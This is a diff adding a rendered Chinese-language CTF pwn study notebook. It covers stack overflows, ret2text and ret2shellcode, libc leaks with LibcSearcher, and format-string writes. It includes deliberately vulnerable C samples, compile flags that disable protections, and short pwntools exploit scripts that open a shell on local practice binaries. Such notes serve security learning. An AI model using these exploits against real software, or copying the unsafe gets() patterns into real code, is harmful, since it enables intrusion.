+  .markdown-body abbr[title]:after {
+    content: " (" attr(title) ")";
+  }
+
+  .markdown-body .ir a:after,
+  .markdown-body a[href^="javascript:"]:after,
+  .markdown-body a[href^="#"]:after {
+    content: "";
+  }
+
+  .markdown-body pre {
+    white-space: pre;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+
+  .markdown-body pre,
+  .markdown-body blockquote {
+    border: 1px solid #999;
+    padding-right: 1em;
+    page-break-inside: avoid;
+  }
+
+  .markdown-body .progress,
+  .markdown-body .progress-bar {
+    -moz-box-shadow: none;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+  }
+
+  .markdown-body .progress {
+    border: 1px solid #ddd;
+  }
+
+  .markdown-body .progress-bar {
+    height: 22px;
+    border-right: 1px solid #ddd;
+  }
+
+  .markdown-body tr,
+  .markdown-body img {
+    page-break-inside: avoid;
+  }
+
+  .markdown-body img {
+    max-width: 100% !important;
+  }
+
+  .markdown-body p,
+  .markdown-body h2,
+  .markdown-body h3 {
+    orphans: 3;
+    widows: 3;
+  }
+
+  .markdown-body h2,
+  .markdown-body h3 {
+    page-break-after: avoid;
+  }
+}
+</style><style>/*GitHub*/
+.codehilite {background-color:#fff;color:#333333;}
+.codehilite .hll {background-color:#ffffcc;}
+.codehilite .c{color:#999988;font-style:italic}
+.codehilite .err{color:#a61717;background-color:#e3d2d2}
+.codehilite .k{font-weight:bold}
+.codehilite .o{font-weight:bold}
+.codehilite .cm{color:#999988;font-style:italic}
+.codehilite .cp{color:#999999;font-weight:bold}
+.codehilite .c1{color:#999988;font-style:italic}
+.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
+.codehilite .gd{color:#000000;background-color:#ffdddd}
+.codehilite .ge{font-style:italic}
+.codehilite .gr{color:#aa0000}
+.codehilite .gh{color:#999999}
+.codehilite .gi{color:#000000;background-color:#ddffdd}
+.codehilite .go{color:#888888}
+.codehilite .gp{color:#555555}
+.codehilite .gs{font-weight:bold}
+.codehilite .gu{color:#800080;font-weight:bold}
+.codehilite .gt{color:#aa0000}
+.codehilite .kc{font-weight:bold}
+.codehilite .kd{font-weight:bold}
+.codehilite .kn{font-weight:bold}
+.codehilite .kp{font-weight:bold}
+.codehilite .kr{font-weight:bold}
+.codehilite .kt{color:#445588;font-weight:bold}
+.codehilite .m{color:#009999}
+.codehilite .s{color:#dd1144}
+.codehilite .n{color:#333333}
+.codehilite .na{color:teal}
+.codehilite .nb{color:#0086b3}
+.codehilite .nc{color:#445588;font-weight:bold}
+.codehilite .no{color:teal}
+.codehilite .ni{color:purple}
+.codehilite .ne{color:#990000;font-weight:bold}
+.codehilite .nf{color:#990000;font-weight:bold}
+.codehilite .nn{color:#555555}
+.codehilite .nt{color:navy}
+.codehilite .nv{color:teal}
+.codehilite .ow{font-weight:bold}
+.codehilite .w{color:#bbbbbb}
+.codehilite .mf{color:#009999}
+.codehilite .mh{color:#009999}
+.codehilite .mi{color:#009999}
+.codehilite .mo{color:#009999}
+.codehilite .sb{color:#dd1144}
+.codehilite .sc{color:#dd1144}
+.codehilite .sd{color:#dd1144}
+.codehilite .s2{color:#dd1144}
+.codehilite .se{color:#dd1144}
+.codehilite .sh{color:#dd1144}
+.codehilite .si{color:#dd1144}
+.codehilite .sx{color:#dd1144}
+.codehilite .sr{color:#009926}
+.codehilite .s1{color:#dd1144}
+.codehilite .ss{color:#990073}
+.codehilite .bp{color:#999999}
+.codehilite .vc{color:teal}
+.codehilite .vg{color:teal}
+.codehilite .vi{color:teal}
+.codehilite .il{color:#009999}
+.codehilite .gc{color:#999;background-color:#EAF2F5}
+</style><title>2019-03-26-PWN</title></head><body><article class="markdown-body"><div class="toc">
+<ul>
+<li><a href="#todo">TODO</a></li>
+<li><a href="#_1">推荐视频</a><ul>
+<li><a href="#cyclic">cyclic</a></li>
+</ul>
+</li>
+<li><a href="#pwn">PWN</a><ul>
+<li><a href="#tips">Tips</a></li>
+<li><a href="#_2">配置环境</a></li>
+<li><a href="#_3">准备工具</a></li>
+<li><a href="#_4">解题思路</a><ul>
+<li><a href="#libcsearcher">LibcSearcher</a></li>
+<li><a href="#_5">学习路径</a></li>
+<li><a href="#_6">常见漏洞</a></li>
+</ul>
+</li>
+<li><a href="#_7">基础学习</a><ul>
+<li><a href="#_8">编译与执行</a><ul>
+<li><a href="#canary">关闭 canary等 保护机制</a></li>
+<li><a href="#gets-read">gets &amp; read</a></li>
+<li><a href="#stack-canary">Stack Canary</a></li>
+<li><a href="#bof-buffer-overflow">bof应用 (buffer overflow)</a></li>
+<li><a href="#offset">如何算offset</a></li>
+<li><a href="#gdb-gdbscript">使用gdb配合脚本调试, gdbscript</a><ul>
+<li><a href="#kaligdb-scriptbug">kali不能执行gdb script的bug</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#bof">bof</a><ul>
+<li><a href="#bof-ret2code">bof-ret2code</a><ul>
+<li><a href="#address">如何找到address? 如何查找函数</a></li>
+</ul>
+</li>
+<li><a href="#bof-ret2shellcode">bof - ret2shellcode</a><ul>
+<li><a href="#shellcode">哪里可以写shellcode?</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#libc">Libc</a><ul>
+<li><a href="#lazy-binding">Lazy binding</a></li>
+<li><a href="#pltgot">plt&amp;got</a></li>
+<li><a href="#got-hijacking">GOT Hijacking</a></li>
+</ul>
+</li>
+<li><a href="#fmt">fmt</a><ul>
+<li><a href="#fmt-read">fmt - read</a></li>
+<li><a href="#fmt-write">fmt - write</a></li>
+<li><a href="#fmt-exploit">fmt - exploit</a></li>
+</ul>
+</li>
+<li><a href="#rop-gadget">ROP Gadget</a><ul>
+<li><a href="#rop-chain">ROP Chain</a></li>
+</ul>
+</li>
+<li><a href="#return-to-plt">Return to PLT</a></li>
+<li><a href="#return-to-libc">Return to Libc</a></li>
+<li><a href="#stack-migration">stack migration</a></li>
+<li><a href="#relo">RELO</a></li>
+<li><a href="#uaf">UAF原理</a></li>
+<li><a href="#todo_1">TODO</a></li>
+</ul>
+</li>
+<li><a href="#_9">常用命令</a></li>
+<li><a href="#pwntools">pwntools</a><ul>
+<li><a href="#_10">本地启动</a></li>
+<li><a href="#_11">怎样调试</a></li>
+<li><a href="#_12">指令介绍</a></li>
+<li><a href="#_13">示例</a><ul>
+<li><a href="#_14">输入字符</a></li>
+<li><a href="#_15">汇编转二进制、数字、字符转换等</a></li>
+<li><a href="#runshellcode">runshellcode</a></li>
+</ul>
+</li>
+<li><a href="#_16">相关知识</a></li>
+</ul>
+</li>
+<li><a href="#one_gadget">one_gadget</a></li>
+<li><a href="#radare2">radare2使用</a></li>
+<li><a href="#_17">练习</a><ul>
+<li><a href="#1">1. 内存泄漏</a></li>
+<li><a href="#symbol-system">读取 symbol system的地址</a></li>
+</ul>
+</li>
+<li><a href="#wiki">Wiki</a><ul>
+<li><a href="#checksec">checksec 、 二进制保护机制</a></li>
+<li><a href="#_18">栈</a></li>
+<li><a href="#c">C代码翻译</a></li>
+<li><a href="#c_1">C语言各数据类型大小和取值范围</a></li>
+<li><a href="#printf">printf</a><ul>
+<li><a href="#_19">$的作用</a></li>
+<li><a href="#cgfsb">示例 CGfsb</a></li>
+</ul>
+</li>
+<li><a href="#plt-glt">PLT &amp; GLT</a></li>
+<li><a href="#_20">常用函数</a><ul>
+<li><a href="#read">read()</a></li>
+<li><a href="#write">write()</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ida">IDA查看栈底地址</a></li>
+</ul>
+</div>
+<h1 id="todo">TODO<a class="headerlink" href="#todo" title="Permanent link"></a></h1>
+<div class="codehilite"><pre>0x0804866b: mov DWORD PTR [esp], 0x8048740 ; 这里是put的参数, 使用 x/s 0x8048740查看值
+0x08048672: call 0x8048460 &lt;puts@plt&gt;
+</pre></div>
+
+<h1 id="_1">推荐视频<a class="headerlink" href="#_1" title="Permanent link"></a></h1>
+<p><a href="https://www.bilibili.com/video/BV1Db411y7g8?p=8">BambooFox-2018-2019年合集-107学年社课</a>
+<a href="https://www.bilibili.com/video/BV1SJ411s7MW">【CTF】NTUSTISC - Pwn 基础教程</a></p>
+<p>资源: 百度网盘群号 6947231953</p>
+<div class="codehilite"><pre>001.练习程序/pwn
+</pre></div>
+
+
+<h2 id="cyclic">cyclic<a class="headerlink" href="#cyclic" title="Permanent link"></a></h2>
+<p>cyclic 200
+输入后看出错的地方，例0x62616164
+cyclic -l 0x62616164</p>
+<h1 id="pwn">PWN<a class="headerlink" href="#pwn" title="Permanent link"></a></h1>
+<p><a href="https://mp.weixin.qq.com/s/nFPCjsaUS8jNhluPvbR_8w">PWN-基础栈溢出题型</a></p>
+<h2 id="tips">Tips<a class="headerlink" href="#tips" title="Permanent link"></a></h2>
+<p><a href="https://blog.csdn.net/weixin_43868725/article/details/105962349#comments_12355290">scanf不接受非法字符</a>
+, 不能 p64(secret0_addr)+&rsquo;%77c%8$n&rsquo;。但是发现上一次输入的值100=0x64的偏移量为7。所以secret0_addr输入，构造payload=&rsquo;%85c%7$n&rsquo;，这样就可以向secret0_addr中写入85了，从而通过验证。</p>
+<h2 id="_2">配置环境<a class="headerlink" href="#_2" title="Permanent link"></a></h2>
+<p>PIP使用国内源</p>
+<div class="codehilite"><pre>mkdir ~/.pip/pip.conf
+vi ~/.pip/pip.conf
+
+复制一下，使用Shift+Insert粘贴内容如下：
+[global]
+index-url = https://pypi.tuna.tsinghua.edu.cn/simple
+[install]
+trusted-host=mirrors.aliyun.com
+</pre></div>
+
+
+<p>最后按esc, wq!回车保存</p>
+<h2 id="_3">准备工具<a class="headerlink" href="#_3" title="Permanent link"></a></h2>
+<p>Linux 下</p>
+<p>sudo pip3 install pwntools</p>
+<div class="codehilite"><pre>如果没有pip就先 sudo apt install python-pip
+</pre></div>
+
+
+<h2 id="_4">解题思路<a class="headerlink" href="#_4" title="Permanent link"></a></h2>
+<p>1.没有NX保护，程序源码自带系统命令函数：直接覆盖返回地址即可
+2.没有NX保护，可以找到system函数的plt的绝对地址：使用ret2text
+3.没有NX保护，找不到system函数，利用输入函数，将shellcode写入到程序中：ret2shellcode
+4.有NX保护，利用ROPGadget配合int 0x80调用execve:ret2Syscal1
+5.有NX保护，利用Libc获取system函数的相对位置：ret2Libc
+6.源码审计:
+    数组未检查。越界</p>
+<p>checksec 查看保护机制，no Stack-canary可以用shellcode。根据不同的保护机制来进行构造不同的payload</p>
+<div class="codehilite"><pre>如果安装了gdb peda, 进入gdb后 checksec filename
+</pre></div>
+
+
+<p>在linux 32位的程序中，传递参数问题</p>
+<div class="codehilite"><pre>传递参数值将参数放入栈中的，当传递的是字符串时表示将这个字符串的地址放入栈中。
+当将一个函数的返回覆盖成另一个函数的地址时需要将这个地址的上面一个位置当成这个函数的返回地址，再上面还有这个函数的参数，当有三个参数时eg：a,b,c这三个参数的入栈次序为c,b,a，即a在最下方
+可以使用pwntools里面自带的功能来构造shellcode。eg：shellcode=asm(shellcraft.sh())
+在栈中存储数字时需要使用p32或者p64进行转换eg：0x123456在栈中从高地址向低地址的存储为56,34,12，因为这是16进制的因此两个一组，当存储字符串时：eg：‘admin’在栈中从高地址向低地址的存储为n,i,m,d,a。
+使用ELF加载程序和process,remote加载程序是不同的，ELF是静态加载的，后面两种是动态的。
+</pre></div>
+
+
+<p>简单溢出思路: </p>
+<p>1、泄露一个ret2libc3函数的位置
+2、获取libc的版本（只有被执行过的函数才能获取地址）</p>
+<p>①https://lilbe.blukat.me ②LibcSearcher:<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a>
+3、根据偏移获取she11和sh的位置
+①求libc基地址（函数动态地址-函数偏移量）
+②求其他函数地址（基地址+函数偏移量）
+4、执行程序获取shell</p>
+<p>简单溢出操作: </p>
+<ol>
+<li>拖进ida, Shift+F12, Ctrl+F 搜flag</li>
+<li>有bin/sh,找溢出点通过system运行bin/sh的地址</li>
+<li>字符串格式化漏洞, 打印多个<code>.%x</code>来计算栈参数位置, 通过溢出或 %85c%7$n 给栈中第7个参数赋值来修改。</li>
+</ol>
+<h3 id="libcsearcher">LibcSearcher<a class="headerlink" href="#libcsearcher" title="Permanent link"></a></h3>
+<p>安装</p>
+<div class="codehilite"><pre>git clone https://github.com/lieanu/LibcSearcher.git
+cd LibcSearcher
+python setup.py develop
+</pre></div>
+
+
+<p>使用</p>
+<p>如果遇到返回多个1ibc版本库的情况，可以通过add_condition（leaked_func，leaked_address）来添加
+限制条件，也可以手工选择其中一个libc版本（如果你确定的话）。</p>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1"># 第二个参数，为已泄露的实际地址，或最后12位（比如:d90）, int类型</span>
+<span class="n">obj</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s">&quot;fgets&quot;</span><span class="p">,</span> <span class="mh">0x7ff39014bd90</span><span class="p">)</span>
+
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;system&quot;</span><span class="p">)</span> <span class="c1"># system偏移</span>
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;str_bin_sh&quot;</span><span class="p">)</span> <span class="c1"># /bin/sh 偏移</span>
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;__libc_start_main_ret&quot;</span><span class="p">)</span>
+</pre></div>
+
+<h3 id="_5">学习路径<a class="headerlink" href="#_5" title="Permanent link"></a></h3>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc">路径</a></p>
+<ol>
+<li>基本ROP</li>
+</ol>
+<p><a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/eeca3548.html">ret2text</a> <a href="http://uuzdaisuki.com/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/">原理</a></p>
+<p>ret2shellcode</p>
+<p>ret2syscall</p>
+<p>ret2libc</p>
+<ol>
+<li>中级ROP</li>
+</ol>
+<p>ret2csu</p>
+<p>ret2reg</p>
+<p>BROP</p>
+<ol>
+<li>高级 ROP</li>
+</ol>
+<p>ret2_dl_runtime_resolve</p>
+<p>SROP</p>
+<p>ret2VDSO</p>
+<h3 id="_6">常见漏洞<a class="headerlink" href="#_6" title="Permanent link"></a></h3>
+<ol>
+<li>
+<p>fgets(&amp;s, 32, edata); 限制了32位长度</p>
+</li>
+<li>
+<p>字符串溢出: 无栈保护, 没有字符长度检查时</p>
+</li>
+<li>字符串格式化漏洞: 用户输入字符，未检查长度，溢出覆盖返回地址。</li>
+<li>整数溢出 int_overflow: 无符号数字 0-255, 超出识别为255内,259识别3。来过些判断</li>
+<li>
+<p>read溢出 返回main, 配合libc读取bin/sh，练习：xman_level3</p>
+</li>
+<li>
+<p>ROP</p>
+</li>
+<li>glibc heap的一些利用.</li>
+<li>IO_FILE结构的利用.</li>
+</ol>
+<p><a href="#_6">内存泄漏</a></p>
+<p>偏向实战:</p>
+<div class="codehilite"><pre>webserver
+虚拟机逆向…
+内核提权..ctf中常常是写的驱动的问题.
+魔改的JS引擎.
+等等等.
+</pre></div>
+
+
+<h2 id="_7">基础学习<a class="headerlink" href="#_7" title="Permanent link"></a></h2>
+<p><a href="https://www.csdn.net/gather_2a/MtTacg4sMDg1NS1ibG9n.html">参考</a></p>
+<p>比如有个函数vulnerable_function() 中执行一个读取操作时</p>
+<table>
+<thead>
+<tr>
+<th>执行过程</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>可读取空间</td>
+</tr>
+<tr>
+<td>可读取空间</td>
+</tr>
+<tr>
+<td>可读取空间</td>
+</tr>
+<tr>
+<td>…………</td>
+</tr>
+<tr>
+<td>s - string</td>
+</tr>
+<tr>
+<td>r - return 返回地址</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="Alt text" src="imgs/pwn01.png" /></p>
+<p><img alt="Alt text" src="imgs/pwn02.png" /></p>
+<p>system函数执行:</p>
+<div class="codehilite"><pre>system_address + &quot;return地址,随意填可为0x1&quot; + bin_sh_addr
+system地址|假返回地址|执行参数(示例为bin/sh的地址)
+</pre></div>
+
+
+<p>shellcode填写函数时，需要加返回地址:</p>
+<div class="codehilite"><pre>0x88*&#39;a&#39;+p32(0xdeadbeef) + 函数地址 + 函数返回地址 + 参数1 + 参数2 + 参数3 ...
+</pre></div>
+
+
+<p>Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p>
+<p><a href="http://blog.eonew.cn/archives/958">栈未对齐引发Crash</a></p>
+<p><a href="https://www.cnblogs.com/Rookle/p/12871878.html">栈未对齐引发Crash1</a></p>
+<p><strong>基本输入输出FD</strong></p>
+<p>fd的类型为int，值为0、1、2,分别代表标准输入、标准输出、标准错误输出。</p>
+<p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">LINUX SYSTEM CALL TABLE FOR X86 64</a></p>
+<h3 id="_8">编译与执行<a class="headerlink" href="#_8" title="Permanent link"></a></h3>
+<p>程序执行顺序 start =&gt; __libc_start_main(main函数是从这里被call的), 所以stack有lib_c_start_main+231的ret addr</p>
+<h4 id="canary">关闭 canary等 保护机制<a class="headerlink" href="#canary" title="Permanent link"></a></h4>
+<div class="codehilite"><pre>gcc test.c -fno-statckprotector -o bof
+gcc test.c -fno-statckprotector -no-pie -o bof
+gcc test.c -fno-statckprotector -no-pie -z execstack -o ret2sc
+</pre></div>
+
+
+<div class="codehilite"><pre><span class="cp"># include &lt;stdio.h&gt;</span>
+    <span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="c1">//Input</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="c1">//0utput</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+
+<table>
+<thead>
+<tr>
+<th>stack</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&hellip;</td>
+<td>low address</td>
+</tr>
+<tr>
+<td>buffer</td>
+<td></td>
+</tr>
+<tr>
+<td>&hellip;</td>
+<td></td>
+</tr>
+<tr>
+<td>saved rbp</td>
+<td></td>
+</tr>
+<tr>
+<td>return address</td>
+<td></td>
+</tr>
+<tr>
+<td>&hellip;</td>
+<td>high address</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<p>输入一长串a后</p>
+<table>
+<thead>
+<tr>
+<th>comment</th>
+<th>stack</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>&hellip;</td>
+<td>low address</td>
+</tr>
+<tr>
+<td>buffer</td>
+<td>aaaaaaaa</td>
+<td>.</td>
+</tr>
+<tr>
+<td>.</td>
+<td>aaaaaaaa</td>
+<td>.</td>
+</tr>
+<tr>
+<td>.</td>
+<td>aaaaaaaa</td>
+<td>.</td>
+</tr>
+<tr>
+<td>.return address被输入盖掉了</td>
+<td>aaaaaaaa</td>
+<td></td>
+</tr>
+<tr>
+<td>.</td>
+<td>aaaaaaaa</td>
+<td>high address</td>
+</tr>
+</tbody>
+</table>
+<h4 id="gets-read">gets &amp; read<a class="headerlink" href="#gets-read" title="Permanent link"></a></h4>
+<ul>
+<li>gets<ul>
+<li>没有限制输入长度</li>
+</ul>
+</li>
+<li>read<ul>
+<li>有限制最大输入长度</li>
+<li>可overflow大小为最大输入长度与buffer长度之间</li>
+</ul>
+</li>
+</ul>
+<p><div class="codehilite"><pre><span class="cp"># include &lt;stdio.h&gt;</span>
+    <span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span> <span class="c1">//最大只能 overflow 8 bytes</span>
+    <span class="c1">// 最大长度16 - buffer 长度(8) = 8</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+<img alt="" src="imgs/pwn_stack02.jpg" /></p>
+<h4 id="stack-canary">Stack Canary<a class="headerlink" href="#stack-canary" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>在rbp之前塞一個random值，ret之前查是否相同，不同的话就 abort</p>
+</li>
+<li>
+<p>有canary的括不能盖到return address rbp</p>
+</li>
+</ul>
+<p><div class="codehilite"><pre>% ./test
+aaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaa
+*** stack smashing detected ***; &lt;unkonw&gt; terminateed
+zsh:abort (core dumped) ./test
+</pre></div>
+<img alt="" src="imgs/pwn_stack03.jpg" /></p>
+<h4 id="bof-buffer-overflow">bof应用 (buffer overflow)<a class="headerlink" href="#bof-buffer-overflow" title="Permanent link"></a></h4>
+<ul>
+<li>先看看stack上有什么<ul>
+<li>local variable</li>
+<li>saved rbp &mdash;&gt; stack migration</li>
+<li>return address &mdash;&gt; ret2 series</li>
+</ul>
+</li>
+</ul>
+<p>bof-local variable
+<div class="codehilite"><pre><span class="cp"># include&lt;stdio.h&gt;</span>
+<span class="cp"># include &lt;stdlib.h&gt;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">8</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">a</span><span class="o">==</span><span class="mi">3</span><span class="p">){</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<img alt="" src="imgs/pwn_stack04.jpg" />
+<img alt="" src="imgs/pwn_stack05.jpg" /></p>
+<h4 id="offset">如何算offset<a class="headerlink" href="#offset" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>先随意输入来确定buffer位置</p>
+</li>
+<li>
+<p>计算buffer位置和目标位置距离多远</p>
+</li>
+</ul>
+<p><img alt="" src="imgs/pwn_stack06.jpg" /></p>
+<p>使用radare2</p>
+<div class="codehilite"><pre>r2 ./bof1
+afl 分析函数
+s main 查看main函数
+VV 进入视图模式
+</pre></div>
+
+
+<h4 id="gdb-gdbscript">使用gdb配合脚本调试, gdbscript<a class="headerlink" href="#gdb-gdbscript" title="Permanent link"></a></h4>
+<p>方法1
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./bof1&#39;</span><span class="p">)</span>
+<span class="nb">raw_input</span><span class="p">()</span> <span class="c1"># 这里断下，执行脚本后看pid是多少比如6113</span>
+<span class="c1"># 新建窗口终端</span>
+<span class="c1"># $gdb</span>
+<span class="c1"># gdb$ attach 6113</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;What</span><span class="se">\&#39;</span><span class="s">s the secret ?&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">&#39;recvuntil&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="s">&#39;AAAAAAAA&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xbeef</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+方法2</p>
+<p><a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/scripts/pwn_000_01_gdbattach.py">pwn_000_01_gdbattach</a></p>
+<h5 id="kaligdb-scriptbug">kali不能执行gdb script的bug<a class="headerlink" href="#kaligdb-scriptbug" title="Permanent link"></a></h5>
+<p><a href="https://juejin.im/post/5e68ff69518825494466bc57">https://juejin.im/post/5e68ff69518825494466bc57</a></p>
+<p>方法1:</p>
+<p>sudo update-alternatives &ndash;config x-terminal-emulator</p>
+<p>可用 lxterm, uxterm, xterm</p>
+<p><a href="https://www.cnblogs.com/wgf4242/p/13232979.html">方法2</a></p>
+<div class="codehilite"><pre>vi /home/kali/.local/lib/python3.8/site-packages/pwnlib/util/misc.py
+# 在Launching a new terminal 这一行后面添加
+argv = argv[:-1] + [x.strip(&#39;&quot;&#39;) for x in argv[-1].split()]
+</pre></div>
+
+<h3 id="bof">bof<a class="headerlink" href="#bof" title="Permanent link"></a></h3>
+<h4 id="bof-ret2code">bof-ret2code<a class="headerlink" href="#bof-ret2code" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>透过Buffer Overflow 改赞 return address</p>
+</li>
+<li>
+<p>将return address改到code中任意处</p>
+</li>
+<li>
+<p>须关闭 PIE</p>
+</li>
+</ul>
+<p><div class="codehilite"><pre><span class="cp"># include&lt;stdio.h&gt;</span>
+<span class="cp"># include &lt;stdlib.h&gt;</span>
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">(){</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<img alt="" src="imgs/pwn_stack07.jpg" /></p>
+<h5 id="address">如何找到address? 如何查找函数<a class="headerlink" href="#address" title="Permanent link"></a></h5>
+<p>三种方式
+<div class="codehilite"><pre>sh<span class="nv">$ </span>objdump -M intel -d filename <span class="p">|</span> less
+sh<span class="nv">$ </span>objdump -d filename
+sh<span class="nv">$ </span>objdump -d -j .plt ./ret2libc3 <span class="p">|</span> grep system     //查找system的plt地址
+sh<span class="nv">$ </span>ROPgadget --binary ./ret2libc3 --string <span class="s2">&quot;/bin/sh&quot;</span>       // 查找bin_sh字符串地址
+gdb-peda<span class="nv">$ </span>p shell
+r2<span class="nv">$ </span>afl~shell
+</pre></div>
+反汇编语法设置默认为AT&amp;T改为Intel语法： 相当于-M
+<div class="codehilite"><pre>set disassembly-flavor intel&gt;~/.gdbinit
+</pre></div></p>
+<p>retn 返回stack栈顶的地址
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./bof&#39;</span><span class="p">)</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x7fffffffe718</span> <span class="o">-</span> <span class="mh">0x7fffffffe700</span>
+<span class="n">hidden</span> <span class="o">=</span> <span class="mh">0x00400566</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">hidden</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+进入gets前，和gets的retn对应offset
+<img alt="" src="imgs/pwn_stack08.jpg" /></p>
+<p>retn</p>
+<p><img alt="" src="imgs/pwn_stack09.jpg" /></p>
+<h4 id="bof-ret2shellcode">bof - ret2shellcode<a class="headerlink" href="#bof-ret2shellcode" title="Permanent link"></a></h4>
+<ul>
+<li>
+<p>透过Buffer Overflow 改赞 return address</p>
+</li>
+<li>
+<p>将return address改到自己写的shell code处并执行</p>
+</li>
+<li>
+<p>须关闭 NX (NX限制执行权限)</p>
+</li>
+<li>
+<p>需要关闭ASLR(地址空间布局随机变化保护)</p>
+</li>
+</ul>
+<p>vmap查看, 开启NX导致w,x不会同时开启。</p>
+<p><img alt="" src="imgs/pwn_stack10.jpg" /></p>
+<p><img alt="" src="imgs/pwn_ret2sc.jpg" /></p>
+<p><img alt="" src="imgs/pwn_ret2shellcode.jpg" /></p>
+<p>可参见 LINUX SYSTEM CALL TABLE FOR X86 64</p>
+<p>exp见 <a href="///D://wgf/My%20Documents/GitHub/blog/vuepress-starter/docs/ctf/scripts/pwn_01_01ret2shellcode2.py">pwn_01_01ret2shellcode2</a></p>
+<p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly">在线转换</a></p>
+<h5 id="shellcode">哪里可以写shellcode?<a class="headerlink" href="#shellcode" title="Permanent link"></a></h5>
+<ul>
+<li>
+<p>选择含有rwx处</p>
+</li>
+<li>
+<p>选择中间部分，因为前後可能会有用到</p>
+</li>
+</ul>
+<p><img alt="" src="imgs/pwn_ret2sc02.jpg" /></p>
